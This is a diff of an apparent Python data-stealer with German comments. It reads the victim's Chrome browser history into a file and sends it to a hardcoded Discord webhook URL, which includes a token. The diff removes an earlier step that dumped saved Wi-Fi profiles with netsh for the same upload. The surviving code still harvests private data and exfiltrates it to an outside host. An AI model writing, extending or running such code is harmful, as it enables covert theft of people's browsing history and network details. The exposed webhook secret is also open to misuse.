@@ -1,16 +1,8 @@
 import requests
-import subprocess
 import os
 
 # Webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1282629894081351743/HypHouPjcge_6Q8VOHrUn4wwoXtYW802B1sBYNOvsFwj9wcOkz7Q9IUyiZv3RC-wtM5P'
-
-def get_wifi_info(output_path):
-    # Führt den netsh-Befehl aus, um WLAN-Informationen zu erhalten
-    wifi_info = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True).stdout.decode()
-    
-    with open(output_path, 'w') as f:
-        f.write(wifi_info)
 
 def get_browser_history(output_path):
     # Beispiel für Google Chrome Browser-Verlauf (kann angepasst werden)
@@ -41,18 +33,13 @@ def send_files_to_discord(files):
 
 def main():
     # Pfade für Dateien
-    wifi_info_path = 'wifi_info.txt'
     browser_history_path = 'browser_history.txt'
 
-    # WLAN-Informationen abrufen
-    get_wifi_info(wifi_info_path)
-    
     # Browser-Verlauf abrufen
     get_browser_history(browser_history_path)
 
     # Dateien für die Übertragung vorbereiten
     files = {
-        'wifi_info.txt': open(wifi_info_path, 'rb'),
         'browser_history.txt': open(browser_history_path, 'rb'),
     }
 
